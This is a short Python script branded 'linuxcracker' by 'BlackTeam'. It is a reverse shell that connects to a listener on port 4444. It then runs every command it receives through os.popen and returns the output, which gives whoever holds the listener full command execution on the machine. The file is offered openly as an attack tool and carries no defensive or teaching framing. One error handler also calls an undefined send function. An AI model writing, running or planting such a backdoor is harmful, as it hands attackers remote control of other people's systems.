#!/usr/bin/env python
class colors:
        def __init__(self):
                self.blue = "\033[94m"
                self.red = "\033[91m"
                self.end = "\033[0m"
cl = colors()
print(cl.red+"""

	*--------------------------------------*
	|       programmed by : Abdessmad      |
	|               BlackTeam              |
	*--------------------------------------*
     ____  _            _    _____                    
    | __ )| | __ _  ___| | _|_   _|__  __ _ _ __ ___  
    |  _ \| |/ _` |/ __| |/ / | |/ _ \/ _` | '_ ` _ \ 
    | |_) | | (_| | (__|   <  | |  __/ (_| | | | | | |
    |____/|_|\__,_|\___|_|\_\ |_|\___|\__,_|_| |_| |_|
 
	              linuxcracker
	                ---------

"""+cl.end)
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.setblocking(1)

ip = "127.0.0.1"
port = 4444

s.connect((ip,port))

s.send(b'Happy Hacking ^_^\n')
while True:
	try:
		command = s.recv(1024).decode('utf-8')
		command = str(command)
		if "cd" in command:
			command = command.replace("\n","")
			command = os.chdir(command.split('cd ')[1])
			com = os.popen("ls")
			result = str(com.read()).encode('utf-8')
			s.send(result)
		else:
			treating = os.popen(command)
			results = str(treating.read())
			results = results.encode('utf-8')
			s.send(results)
	except socket.error:
		exit(0)
	except OSError:
		s.send(b'file not found!\n')
	except IndexError:
		s.send(b'try again!\n')
	except UnicodeEncodeError:
		send(b'problem in coding\n')
	except KeyboardInterrupt:
		s.send(b'connection closed !!\n')
		exit(0)
